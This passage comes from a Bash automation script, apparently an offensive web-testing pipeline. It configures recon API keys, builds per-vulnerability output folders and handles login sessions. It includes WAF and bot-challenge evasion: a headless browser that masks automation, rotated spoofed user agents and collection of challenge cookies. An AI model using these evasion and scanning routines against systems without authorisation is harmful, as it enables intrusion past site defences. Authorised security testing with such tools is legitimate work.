    [[ -n "${SECURITYTRAILS_KEY:-}" ]] && export FINDOMAIN_SECURITYTRAILS_KEY="$SECURITYTRAILS_KEY"
    [[ -n "${VIRUSTOTAL_KEY:-}"      ]] && export FINDOMAIN_VIRUSTOTAL_KEY="$VIRUSTOTAL_KEY"
    [[ -n "${CHAOS_KEY:-}"           ]] && export FINDOMAIN_CHAOS_KEY="$CHAOS_KEY"

    # â”€â”€ bbot secrets config â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    mkdir -p "${HOME}/.bbot/config"
    cat > "${HOME}/.bbot/config/secrets.yml" << BBOT_EOF
modules:
  shodan_dns:
    api_key: "${SHODAN_API_KEY:-}"
  virustotal:
    api_key: "${VIRUSTOTAL_KEY:-}"
  censys:
    api_id: "${CENSYS_API_ID:-}"
    api_secret: "${CENSYS_API_SECRET:-}"
  chaos:
    api_key: "${PDCP_API_KEY:-}"
  securitytrails:
    api_key: "${SECURITYTRAILS_KEY:-}"
  github_codesearch:
    api_key: "${GITHUB_TOKEN:-}"
  leakix:
    api_key: "${LEAKIX_KEY:-}"
  binaryedge:
    api_key: "${BINARYEDGE_KEY:-}"
  passivetotal:
    username: "${PASSIVETOTAL_USER:-}"
    api_key: "${PASSIVETOTAL_KEY:-}"
  urlscan:
    api_key: "${URLSCAN_KEY:-}"
  fullhunt:
    api_key: "${FULLHUNT_KEY:-}"
BBOT_EOF

    # Summary of active keys
    local _active=()
    [[ -n "${PDCP_API_KEY:-}"        ]] && _active+=("ProjectDiscovery")
    [[ -n "${SHODAN_API_KEY:-}"      ]] && _active+=("Shodan")
    [[ -n "${SECURITYTRAILS_KEY:-}"  ]] && _active+=("SecurityTrails")
    [[ -n "${CENSYS_API_ID:-}"       ]] && _active+=("Censys")
    [[ -n "${VIRUSTOTAL_KEY:-}"      ]] && _active+=("VirusTotal")
    [[ -n "${GITHUB_TOKEN:-}"        ]] && _active+=("GitHub")
    [[ -n "${BINARYEDGE_KEY:-}"      ]] && _active+=("BinaryEdge")
    [[ -n "${FULLHUNT_KEY:-}"        ]] && _active+=("FullHunt")
    [[ -n "${LEAKIX_KEY:-}"          ]] && _active+=("LeakIX")
    if [[ ${#_active[@]} -gt 0 ]]; then
        log_ok "Active API keys: ${_active[*]}"
    else
        log_warn "All API keys blank â€” add keys to ${_keys_file} for maximum coverage"
    fi
}

# â”€â”€â”€ Directory setup â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
setup_dirs() {
    if $RESUME && [[ -z "$OUTDIR" ]]; then
        local latest_outdir=""
        if [[ -d "$(pwd)/results" ]]; then
            latest_outdir=$(find "$(pwd)/results" -maxdepth 1 -mindepth 1 -type d \
                -name "${TARGET}_*" -printf '%T@ %p\n' 2>/dev/null | sort -nr | \
                awk 'NR==1 {$1=""; sub(/^ /, ""); print}')
        fi
        if [[ -n "$latest_outdir" ]]; then
            OUTDIR="$latest_outdir"
            log_info "Resume: using latest output directory: ${OUTDIR}"
        fi
    fi

    local date_stamp; date_stamp=$(date +%Y%m%d_%H%M%S)
    [[ -z "$OUTDIR" ]] && OUTDIR="$(pwd)/results/${TARGET}_${date_stamp}"

    if $RESUME && [[ -d "$OUTDIR" ]]; then
        log_warn "Resuming scan in: $OUTDIR"
    else
        $RESUME && log_warn "Resume requested, but no existing output directory was found. Starting a new scan in: $OUTDIR"
        mkdir -p "$OUTDIR"
    fi

    mkdir -p \
        "$OUTDIR/recon/subdomains" \
        "$OUTDIR/recon/dns" \
        "$OUTDIR/recon/ports" \
        "$OUTDIR/recon/http" \
        "$OUTDIR/recon/urls" \
        "$OUTDIR/recon/js" \
        "$OUTDIR/recon/js/bundles" \
        "$OUTDIR/vulns/js_analysis" \
        "$OUTDIR/recon/wordlists" \
        "$OUTDIR/vulns/nuclei" \
        "$OUTDIR/vulns/xss" \
        "$OUTDIR/vulns/sqli" \
        "$OUTDIR/vulns/ssrf" \
        "$OUTDIR/vulns/cors" \
        "$OUTDIR/vulns/takeover" \
        "$OUTDIR/vulns/403bypass" \
        "$OUTDIR/vulns/secrets" \
        "$OUTDIR/vulns/idor" \
        "$OUTDIR/vulns/bac" \
        "$OUTDIR/vulns/ssti" \
        "$OUTDIR/vulns/xxe" \
        "$OUTDIR/vulns/jwt" \
        "$OUTDIR/vulns/graphql" \
        "$OUTDIR/vulns/oauth" \
        "$OUTDIR/screenshots" \
        "$OUTDIR/reports"

    # Convenience path variables
    SUBS_DIR="$OUTDIR/recon/subdomains"
    DNS_DIR="$OUTDIR/recon/dns"
    PORTS_DIR="$OUTDIR/recon/ports"
    HTTP_DIR="$OUTDIR/recon/http"
    URLS_DIR="$OUTDIR/recon/urls"
    JS_DIR="$OUTDIR/recon/js"
    JS_BUNDLES_DIR="$OUTDIR/recon/js/bundles"
    JS_API_ENDPOINTS="$OUTDIR/recon/js/api_endpoints.txt"
    JS_ENV_URLS="$OUTDIR/recon/js/env_urls.txt"
    JS_PROBE_RESULTS="$OUTDIR/vulns/js_analysis/endpoint_probe.txt"
    VULN_DIR="$OUTDIR/vulns"
    SHOTS_DIR="$OUTDIR/screenshots"
    REPORT_DIR="$OUTDIR/reports"

    # Key output files
    ALL_SUBS="$SUBS_DIR/all_subs.txt"
    RESOLVED_SUBS="$SUBS_DIR/resolved_subs.txt"
    LIVE_HOSTS="$HTTP_DIR/live_hosts.txt"
    ALL_URLS="$URLS_DIR/all_urls.txt"
    JS_FILES="$JS_DIR/js_files.txt"
    RESOLVERS="$OUTDIR/recon/dns/resolvers.txt"

    # Pre-create all output files so wc -l never fails
    touch "$ALL_SUBS" "$RESOLVED_SUBS" "$LIVE_HOSTS" "$ALL_URLS" "$JS_FILES" \
        "$VULN_DIR/nuclei/critical_high.jsonl" \
        "$VULN_DIR/nuclei/all_findings.jsonl" \
        "$VULN_DIR/nuclei/injections.jsonl" \
        "$VULN_DIR/nuclei/panels_tokens.jsonl" \
        "$VULN_DIR/xss/dalfox_findings.txt" \
        "$VULN_DIR/xss/reflected.txt" \
        "$VULN_DIR/sqli/sqli_candidates.txt" \
        "$VULN_DIR/sqli/error_based.txt" \
        "$VULN_DIR/sqli/error_based_confirmed.txt" \
        "$VULN_DIR/sqli/timebased_confirmed.txt" \
        "$VULN_DIR/ssrf/open_redirects.txt" \
        "$VULN_DIR/cors/cors_findings.txt" \
        "$VULN_DIR/takeover/dangling_cnames.txt" \
        "$VULN_DIR/secrets/js_secrets.txt" \
        "$VULN_DIR/403bypass/bypassed.txt" \
        "$VULN_DIR/idor/findings.txt" \
        "$VULN_DIR/idor/candidates.txt" \
        "$VULN_DIR/bac/findings.txt" \
        "$VULN_DIR/bac/candidates.txt" \
        "$VULN_DIR/ssti/findings.txt" \
        "$VULN_DIR/xxe/findings.txt" \
        "$VULN_DIR/jwt/findings.txt" \
        "$VULN_DIR/graphql/findings.txt" \
        "$VULN_DIR/oauth/findings.txt" \
        "$HTTP_DIR/sensitive_files.txt" \
        "$JS_API_ENDPOINTS" \
        "$JS_ENV_URLS" \
        "$JS_PROBE_RESULTS" 2>/dev/null || true

    # Live findings log â€” accumulates all [FINDING] lines in real time
    LIVE_FINDINGS_LOG="$OUTDIR/LIVE_FINDINGS.txt"
    touch "$LIVE_FINDINGS_LOG"

    log_ok "Output directory: ${BOLD}$OUTDIR${RESET}"

    # URL-list mode: pre-seed LIVE_HOSTS (and ALL_SUBS for compatibility)
    if [[ -n "$URL_LIST" && -f "$URL_LIST" ]]; then
        grep -E "^https?://" "$URL_LIST" | sort -u > "$LIVE_HOSTS"
        grep -oP '(?<=://)[^/:]+' "$URL_LIST" | sort -u > "$ALL_SUBS"
        cp "$LIVE_HOSTS" "$RESOLVED_SUBS" 2>/dev/null || true
        log_ok "URL-list: loaded $(wc -l < "$LIVE_HOSTS") targets from $URL_LIST"
    fi

    # Base-URL mode (-d https://host): seed LIVE_HOSTS with the single URL
    if [[ -n "$BASE_URL" ]]; then
        echo "$BASE_URL" > "$LIVE_HOSTS"
        echo "$TARGET"   > "$ALL_SUBS"
        cp "$LIVE_HOSTS" "$RESOLVED_SUBS" 2>/dev/null || true
        log_ok "Base-URL mode: seeded LIVE_HOSTS with ${BASE_URL}"
    fi
}

# â”€â”€â”€ Authentication â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

# Build extra -H opts from CUSTOM_HEADERS_ARGS for curl/httpx/nuclei/ffuf etc.
_custom_header_curl_opts() {
    local -a out=()
    for h in "${CUSTOM_HEADERS_ARGS[@]+"${CUSTOM_HEADERS_ARGS[@]}"}"; do
        out+=("-H" "$h")
    done
    echo "${out[@]+"${out[@]}"}"
}

# Populate all AUTH_*_OPTS from a cookie string
_populate_auth_from_cookie() {
    local cookie="$1"
    local hdr="Cookie: $cookie"
    local custom_curl=(); local custom_dalfox=(); local custom_sqlmap=()
    for h in "${CUSTOM_HEADERS_ARGS[@]+"${CUSTOM_HEADERS_ARGS[@]}"}"; do
        custom_curl+=("-H" "$h"); custom_dalfox+=("--header" "$h"); custom_sqlmap+=("--headers" "$h")
    done
    AUTH_CURL_OPTS=("-H" "$hdr" "${custom_curl[@]+"${custom_curl[@]}"}")
    AUTH_HTTPX_OPTS=("-H" "$hdr" "${custom_curl[@]+"${custom_curl[@]}"}")
    AUTH_NUCLEI_OPTS=("-H" "$hdr" "${custom_curl[@]+"${custom_curl[@]}"}")
    AUTH_FFUF_OPTS=("-H" "$hdr" "${custom_curl[@]+"${custom_curl[@]}"}")
    AUTH_KATANA_OPTS=("-H" "$hdr" "${custom_curl[@]+"${custom_curl[@]}"}")
    AUTH_DALFOX_OPTS=("--cookie" "$cookie" "${custom_dalfox[@]+"${custom_dalfox[@]}"}")
    AUTH_SQLMAP_OPTS=("--cookie" "$cookie" "${custom_sqlmap[@]+"${custom_sqlmap[@]}"}")
    AUTH_FEROX_OPTS=("-H" "$hdr" "${custom_curl[@]+"${custom_curl[@]}"}")
}

# Populate all AUTH_*_OPTS from a JWT / Bearer token
_populate_auth_from_token() {
    local jwt="$1"
    local hdr="Authorization: Bearer $jwt"
    local custom_curl=(); local custom_dalfox=(); local custom_sqlmap=()
    for h in "${CUSTOM_HEADERS_ARGS[@]+"${CUSTOM_HEADERS_ARGS[@]}"}"; do
        custom_curl+=("-H" "$h"); custom_dalfox+=("--header" "$h"); custom_sqlmap+=("--headers" "$h")
    done
    AUTH_CURL_OPTS=("-H" "$hdr" "${custom_curl[@]+"${custom_curl[@]}"}")
    AUTH_HTTPX_OPTS=("-H" "$hdr" "${custom_curl[@]+"${custom_curl[@]}"}")
    AUTH_NUCLEI_OPTS=("-H" "$hdr" "${custom_curl[@]+"${custom_curl[@]}"}")
    AUTH_FFUF_OPTS=("-H" "$hdr" "${custom_curl[@]+"${custom_curl[@]}"}")
    AUTH_KATANA_OPTS=("-H" "$hdr" "${custom_curl[@]+"${custom_curl[@]}"}")
    AUTH_DALFOX_OPTS=("--header" "$hdr" "${custom_dalfox[@]+"${custom_dalfox[@]}"}")
    AUTH_SQLMAP_OPTS=("--headers" "$hdr" "${custom_sqlmap[@]+"${custom_sqlmap[@]}"}")
    AUTH_FEROX_OPTS=("-H" "$hdr" "${custom_curl[@]+"${custom_curl[@]}"}")
}

# Populate all AUTH_*_OPTS from a JWT stored in a named cookie
_populate_auth_from_jwt_in_cookie() {
    local cookie_name="$1" jwt="$2"
    local cookie_str="${cookie_name}=${jwt}"
    local hdr="Cookie: $cookie_str"
    local custom_curl=(); local custom_dalfox=(); local custom_sqlmap=()
    for h in "${CUSTOM_HEADERS_ARGS[@]+"${CUSTOM_HEADERS_ARGS[@]}"}"; do
        custom_curl+=("-H" "$h"); custom_dalfox+=("--header" "$h"); custom_sqlmap+=("--headers" "$h")
    done
    AUTH_CURL_OPTS=("-H" "$hdr" "${custom_curl[@]+"${custom_curl[@]}"}")
    AUTH_HTTPX_OPTS=("-H" "$hdr" "${custom_curl[@]+"${custom_curl[@]}"}")
    AUTH_NUCLEI_OPTS=("-H" "$hdr" "${custom_curl[@]+"${custom_curl[@]}"}")
    AUTH_FFUF_OPTS=("-H" "$hdr" "${custom_curl[@]+"${custom_curl[@]}"}")
    AUTH_KATANA_OPTS=("-H" "$hdr" "${custom_curl[@]+"${custom_curl[@]}"}")
    AUTH_DALFOX_OPTS=("--cookie" "$cookie_str" "${custom_dalfox[@]+"${custom_dalfox[@]}"}")
    AUTH_SQLMAP_OPTS=("--cookie" "$cookie_str" "${custom_sqlmap[@]+"${custom_sqlmap[@]}"}")
    AUTH_FEROX_OPTS=("-H" "$hdr" "${custom_curl[@]+"${custom_curl[@]}"}")
}

# Refresh JWT using OAuth refresh_token grant
# Updates AUTH_TOKEN + re-populates AUTH_*_OPTS
# Returns 0 on success
_refresh_jwt() {
    [[ -z "$JWT_REFRESH_URL" || -z "$JWT_REFRESH_TOKEN" ]] && return 1
    local tmp_body; tmp_body=$(mktemp /tmp/webpwn_refresh_XXXXXX)
    local tmp_hdr; tmp_hdr=$(mktemp /tmp/webpwn_refresh_hdr_XXXXXX)

    curl -s -X POST \
        -H "Content-Type: application/json" \
        -H "Accept: application/json" \
        -D "$tmp_hdr" \
        -d "{\"grant_type\":\"refresh_token\",\"refresh_token\":\"${JWT_REFRESH_TOKEN}\"}" \
        --connect-timeout 10 --max-time 20 \
        -o "$tmp_body" \
        "$JWT_REFRESH_URL" 2>/dev/null

    local new_jwt; new_jwt=$(_extract_jwt_from_response "$tmp_body" "$tmp_hdr")
    rm -f "$tmp_body" "$tmp_hdr"

    if [[ -n "$new_jwt" ]]; then
        AUTH_TOKEN="$new_jwt"
        if $JWT_COOKIE_MODE && [[ -n "$JWT_COOKIE_NAME" ]]; then
            _populate_auth_from_jwt_in_cookie "$JWT_COOKIE_NAME" "$new_jwt"
        else
            _populate_auth_from_token "$new_jwt"
        fi
        JWT_EXPIRY=$(python3 -c "
import sys, json, base64, time
jwt = sys.argv[1]
parts = jwt.split('.')
pad = parts[1] + '=' * (4 - len(parts[1]) % 4)
try:
    d = json.loads(base64.urlsafe_b64decode(pad))
    print(int(d.get('exp', 0)))
except: print(0)
" "$new_jwt" 2>/dev/null || echo 0)
        echo "$AUTH_TOKEN" > "$OUTDIR/auth_jwt_${AUTH_ROLE1}.txt" 2>/dev/null || true
        log_ok "JWT refreshed â€” new token saved (exp=${JWT_EXPIRY})"
        return 0
    fi
    log_warn "JWT refresh failed â€” continuing with existing token"
    return 1
}

# Background JWT refresh daemon â€” re-auths 60s before expiry
# Call after setup_auth when creds or refresh token available
_start_jwt_refresh_daemon() {
    (
        while kill -0 $$ 2>/dev/null; do
            sleep 30
            local now; now=$(date +%s)
            # If we have a refresh token AND token is within 90 seconds of expiry
            if [[ -n "$JWT_REFRESH_TOKEN" && -n "$JWT_REFRESH_URL" ]]; then
                if [[ "$JWT_EXPIRY" -gt 0 ]] && (( now >= JWT_EXPIRY - 90 )); then
                    log_info "[jwt-refresh] Token expiring soon â€” refreshing..."
                    _refresh_jwt 2>/dev/null || true
                fi
            # Else if we have login creds and token is expiring, re-login
            elif [[ -n "$AUTH_USER" && -n "$AUTH_PASS" && -n "$AUTH_LOGIN_URL" ]]; then
                if [[ "$JWT_EXPIRY" -gt 0 ]] && (( now >= JWT_EXPIRY - 90 )); then
                    log_info "[jwt-refresh] Token expiring soon â€” re-logging in..."
                    local old_type="$AUTH_LOGIN_TYPE"
                    if _perform_login "$AUTH_LOGIN_URL" "$AUTH_FORM_USER_FIELD" \
                            "$AUTH_FORM_PASS_FIELD" "$AUTH_USER" "$AUTH_PASS" "$AUTH_ROLE1"; then
                        if [[ "$AUTH_LOGIN_TYPE" == "jwt" ]]; then
                            _populate_auth_from_token "$AUTH_TOKEN"
                            _decode_jwt_claims "$AUTH_TOKEN" 2>/dev/null || true
                            echo "$AUTH_TOKEN" > "$OUTDIR/auth_jwt_${AUTH_ROLE1}.txt" 2>/dev/null || true
                        fi
                    fi
                fi
            fi
        done
    ) &
    JWT_REFRESH_PID=$!
    trap 'kill "$JWT_REFRESH_PID" 2>/dev/null || true' EXIT INT TERM
    log_info "JWT refresh daemon started (PID ${JWT_REFRESH_PID})"
}

# Decode JWT payload and extract user ID + role for IDOR/BAC context
_decode_jwt_claims() {
    local jwt="$1"
    local claims; claims=$(python3 -c "
import sys, json, base64
parts = sys.argv[1].split('.')
if len(parts) != 3: sys.exit(1)
pad = parts[1] + '=' * (4 - len(parts[1]) % 4)
try:
    decoded = json.loads(base64.urlsafe_b64decode(pad))
    print(json.dumps(decoded, indent=2))
except Exception as e:
    pass
" "$jwt" 2>/dev/null || echo "")

    [[ -z "$claims" ]] && return

    # Save full claims
    echo "$claims" > "$OUTDIR/auth_jwt_claims.json"
    log_info "  JWT claims saved â†’ $OUTDIR/auth_jwt_claims.json"

    # Extract user ID (sub / user_id / userId / uid / id)
    AUTH_JWT_USER_ID=$(echo "$claims" | python3 -c "
import sys, json
d = json.load(sys.stdin)
for k in ['sub','user_id','userId','uid','id','account_id']:
    v = d.get(k,'')
    if v: print(str(v)); break
" 2>/dev/null || echo "")

    # Extract role / scope
    AUTH_JWT_ROLE=$(echo "$claims" | python3 -c "
import sys, json
d = json.load(sys.stdin)
for k in ['role','roles','scope','authorities','permissions','groups']:
    v = d.get(k,'')
    if v: print(str(v)); break
" 2>/dev/null || echo "")

    [[ -n "$AUTH_JWT_USER_ID" ]] && log_ok "  JWT user ID: ${AUTH_JWT_USER_ID}"
    [[ -n "$AUTH_JWT_ROLE"    ]] && log_ok "  JWT role: ${AUTH_JWT_ROLE}"

    # Extract expiry for refresh daemon
    JWT_EXPIRY=$(echo "$claims" | python3 -c "
import sys, json
d = json.load(sys.stdin)
print(int(d.get('exp', 0)))
" 2>/dev/null || echo 0)
    if [[ "$JWT_EXPIRY" -gt 0 ]]; then
        local exp_fmt; exp_fmt=$(date -d "@${JWT_EXPIRY}" '+%Y-%m-%d %H:%M:%S' 2>/dev/null || \
            date -r "$JWT_EXPIRY" '+%Y-%m-%d %H:%M:%S' 2>/dev/null || echo "unix:${JWT_EXPIRY}")
        log_info "  JWT expires: ${exp_fmt}"
        local now; now=$(date +%s)
        (( JWT_EXPIRY < now )) && log_warn "  JWT is already EXPIRED â€” scans may be unauthenticated!"
    else
        log_warn "  JWT has no 'exp' claim â€” no expiry (will not auto-refresh)"
    fi

    # Warn if role indicates admin / superuser (useful to know before BAC testing)
    echo "$AUTH_JWT_ROLE" | grep -qiE "admin|super|root|staff|operator" && \
        log_warn "  JWT role appears to be privileged â€” good for BAC baseline"
}

# Extract JWT from a response body (JSON) and/or response headers
# Prints the JWT string if found, empty otherwise
_extract_jwt_from_response() {
    local body_file="$1" header_file="$2"

    # 1. JSON body â€” recursive search for token fields
    local jwt; jwt=$(python3 -c "
import sys, json, re
body = open('$body_file').read()
try:
    data = json.loads(body)
    def find(d, depth=0):
        if depth > 4: return ''
        if isinstance(d, dict):
            for k in ['token','access_token','accessToken','jwt','id_token','idToken',
                      'auth_token','authToken','bearer','Authorization']:
                v = d.get(k,'')
                if isinstance(v, str) and v.count('.')==2 and len(v)>40:
                    return v
            for v in d.values():
                r = find(v, depth+1)
                if r: return r
        elif isinstance(d, list):
            for item in d:
                r = find(item, depth+1)
                if r: return r
        return ''
    print(find(data))
except:
    # Regex fallback on raw body
    m = re.search(r'[\"'\''](ey[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,})[\"'\'']', body)
    if m: print(m.group(1))
" 2>/dev/null || echo "")

    # 2. Response headers (Authorization: Bearer ..., X-Auth-Token, X-Access-Token)
    if [[ -z "$jwt" && -f "$header_file" ]]; then
        jwt=$(grep -iE "^(authorization|x-auth-token|x-access-token|x-token|x-jwt):" "$header_file" 2>/dev/null \
            | grep -oE "ey[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}" | head -1)
    fi

    # 3. Set-Cookie that contains a JWT value
    if [[ -z "$jwt" && -f "$header_file" ]]; then
        jwt=$(grep -i "^set-cookie:" "$header_file" 2>/dev/null \
            | grep -oE "ey[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}" | head -1)
    fi

    echo "$jwt"
}

# Headless browser login â€” handles JS challenges (Incapsula, Cloudflare, etc.)
# that curl cannot bypass. Uses Playwright + Chromium to:
#   1. Navigate to the base URL (passes the JS bot challenge automatically)
#   2. Wait for the login form to appear (handles SPA client-side routing)
#   3. Fill username + password and submit
#   4. Extract all session cookies and write them to AUTH_SESSION_FILE
# Falls back to curl-based login if Playwright is not available.
_headless_login() {
    local login_url="$1" username="$2" password="$3"
    local base_url; base_url=$(python3 -c "
from urllib.parse import urlparse; u=urlparse('${login_url}'); print(f'{u.scheme}://{u.netloc}')
" 2>/dev/null || echo "$login_url")

    python3 -c "import playwright" 2>/dev/null || { log_warn "  Playwright not available â€” skipping headless login"; return 1; }

    log_info "  Headless browser login (Playwright/Chromium) â†’ ${login_url}"

    local result; result=$(python3 - <<PYEOF 2>/dev/null
import asyncio, json, sys
from playwright.async_api import async_playwright, TimeoutError as PWTimeout

LOGIN_URL   = "${login_url}"
BASE_URL    = "${base_url}"
USERNAME    = "${username}"
PASSWORD    = "${password}"
JAR_FILE    = "${AUTH_SESSION_FILE}"

# Input selectors tried in order for username / password fields
USER_SELS  = ['input[type="email"]','input[name*="user"]','input[name*="email"]',
               'input[id*="user"]','input[id*="email"]','input[placeholder*="user" i]',
               'input[placeholder*="email" i]','input[autocomplete="username"]']
PASS_SELS  = ['input[type="password"]','input[name*="pass"]','input[id*="pass"]',
               'input[placeholder*="pass" i]','input[autocomplete="current-password"]']
SUBMIT_SELS= ['button[type="submit"]','input[type="submit"]','button:has-text("Login")',
               'button:has-text("Sign in")','button:has-text("Log in")','[type="submit"]']

async def find_first(page, sels, timeout=5000):
    for sel in sels:
        try:
            el = page.locator(sel).first
            await el.wait_for(state="visible", timeout=timeout)
            return el
        except PWTimeout:
            continue
    return None

async def run():
    async with async_playwright() as p:
        browser = await p.chromium.launch(headless=True,
            args=["--no-sandbox","--disable-setuid-sandbox",
                  "--disable-blink-features=AutomationControlled"])
        ctx = await browser.new_context(
            user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
            viewport={"width":1280,"height":800},
            locale="en-US",
            extra_http_headers={"Accept-Language":"en-US,en;q=0.9"})
        page = await ctx.new_page()

        # Navigate to base URL â€” Incapsula JS challenge runs and is solved
        try:
            await page.goto(BASE_URL, wait_until="networkidle", timeout=30000)
        except Exception:
            await page.goto(BASE_URL, timeout=30000)

        # If not already on login page, navigate there
        if LOGIN_URL != BASE_URL:
            try:
                await page.goto(LOGIN_URL, wait_until="networkidle", timeout=20000)
            except Exception:
                await page.goto(LOGIN_URL, timeout=20000)

        # Wait for SPA to render login form (Angular/React may take a moment)
        await page.wait_for_timeout(3000)

        user_el = await find_first(page, USER_SELS, timeout=8000)
        pass_el = await find_first(page, PASS_SELS, timeout=5000)

        if not user_el or not pass_el:
            print("ERROR: login form fields not found", file=sys.stderr)
            await browser.close()
            sys.exit(1)

        await user_el.fill(USERNAME)
        await page.wait_for_timeout(500)
        await pass_el.fill(PASSWORD)
        await page.wait_for_timeout(500)

        submit_el = await find_first(page, SUBMIT_SELS, timeout=5000)
        if submit_el:
            await submit_el.click()
        else:
            await pass_el.press("Enter")

        # Wait for navigation after submit
        try:
            await page.wait_for_load_state("networkidle", timeout=15000)
        except Exception:
            await page.wait_for_timeout(5000)

        # Extract all cookies and write Netscape cookie jar format
        cookies = await ctx.cookies()
        if not cookies:
            print("ERROR: no cookies after login", file=sys.stderr)
            await browser.close()
            sys.exit(1)

        with open(JAR_FILE, "w") as f:
            f.write("# Netscape HTTP Cookie File\n")
            for c in cookies:
                httponly = "#HttpOnly_" if c.get("httpOnly") else ""
                domain   = c.get("domain","")
                flag     = "TRUE" if domain.startswith(".") else "FALSE"
                path     = c.get("path","/")
                secure   = "TRUE" if c.get("secure") else "FALSE"
                expires  = int(c.get("expires",-1)) if c.get("expires",-1) > 0 else 0
                name     = c.get("name","")
                value    = c.get("value","")
                f.write(f"{httponly}{domain}\t{flag}\t{path}\t{secure}\t{expires}\t{name}\t{value}\n")

        # Also output cookie string for AUTH_COOKIE
        cookie_str = "; ".join(f"{c['name']}={c['value']}" for c in cookies)
        print(cookie_str)
        await browser.close()

asyncio.run(run())
PYEOF
)

    if [[ $? -eq 0 && -n "$result" && "$result" != ERROR* ]]; then
        AUTH_COOKIE="$result"
        AUTH_LOGIN_TYPE="cookie"
        log_ok "  Headless login succeeded â€” ${#result} chars of cookies captured"
        return 0
    else
        log_warn "  Headless login failed â€” form not found or login rejected"
        return 1
    fi
}

# Bootstrap WAF session cookies by making a warm-up GET to the base URL.
# Incapsula / Imperva sets visid_incap_* + incap_ses_* cookies even on 403
# responses. Replaying those cookies on subsequent requests sometimes clears
# the bot challenge and allows the login POST to reach the app.
# Writes collected cookies into the provided cookie jar file.
_bootstrap_waf_session() {
    local base_url="$1" jar="$2"
    local -a _uas=(
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
        "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
    )
    local _ua="${_uas[$((RANDOM % ${#_uas[@]}))]}"

    # Pass 1 â€” cold hit, collect WAF challenge cookies
    curl -sk -o /dev/null \
        -c "$jar" -b "$jar" \
        -L --max-redirs 5 --connect-timeout 10 --max-time 15 \
        -H "User-Agent: ${_ua}" \
        -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" \
        -H "Accept-Language: en-US,en;q=0.9" \
        -H "Accept-Encoding: gzip, deflate, br" \
        -H "Connection: keep-alive" \
        -H "Upgrade-Insecure-Requests: 1" \
        "$base_url" 2>/dev/null

    # Pass 2 â€” replay cookies, simulate page revisit (clears some JS challenges)
    curl -sk -o /dev/null \
        -c "$jar" -b "$jar" \
        -L --max-redirs 5 --connect-timeout 10 --max-time 15 \
        -H "User-Agent: ${_ua}" \
        -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" \
        -H "Accept-Language: en-US,en;q=0.9" \
        -H "Referer: ${base_url}/" \
        "$base_url" 2>/dev/null

    local waf_cookies; waf_cookies=$(grep -E "visid_incap|incap_ses|nlbi_|__cfduid|cf_clearance|_abck|ak_bmsc|BIGipServer|AWSALB" \
        "$jar" 2>/dev/null | wc -l)
    [[ "$waf_cookies" -gt 0 ]] && \
        log_info "  WAF session bootstrap: ${waf_cookies} challenge cookie(s) collected"
}

# Form POST login â€” tries application/x-www-form-urlencoded
# On success sets AUTH_COOKIE (cookie session) OR AUTH_TOKEN (JWT) + AUTH_LOGIN_TYPE
_try_form_login() {
    local login_url="$1" user_field="$2" pass_field="$3" username="$4" password="$5"
    local tmp_jar; tmp_jar=$(mktemp /tmp/webpwn_jar_XXXXXX)
    local tmp_body; tmp_body=$(mktemp /tmp/webpwn_body_XXXXXX)
    local tmp_hdr; tmp_hdr=$(mktemp /tmp/webpwn_hdr_XXXXXX)

    # Bootstrap WAF session â€” collect challenge cookies before the login POST
    local _base_url; _base_url=$(python3 -c "
from urllib.parse import urlparse; u=urlparse('${login_url}'); print(f'{u.scheme}://{u.netloc}')
" 2>/dev/null || echo "${login_url%%/login*}")
    _bootstrap_waf_session "$_base_url" "$tmp_jar"

    # Also GET the login page itself to pick up any CSRF token cookies
    curl -sk -o /dev/null \
        -c "$tmp_jar" -b "$tmp_jar" \
        -L --max-redirs 5 --connect-timeout 10 \
        -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36" \
        -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" \
        "${WAF_EVASION_CURL_OPTS[@]+"${WAF_EVASION_CURL_OPTS[@]}"}" \
        "$login_url" 2>/dev/null

    # Honour WAF delay between page-load and form POST so WAF rate limiter doesn't block
    waf_sleep

    curl -s \
        -c "$tmp_jar" -b "$tmp_jar" \
        -X POST \
        -D "$tmp_hdr" \
        --data-urlencode "${user_field}=${username}" \
        --data-urlencode "${pass_field}=${password}" \
        -L --max-redirs 5 \
        --connect-timeout 10 \
        -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36" \
        -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" \
        -H "Accept-Language: en-US,en;q=0.9" \
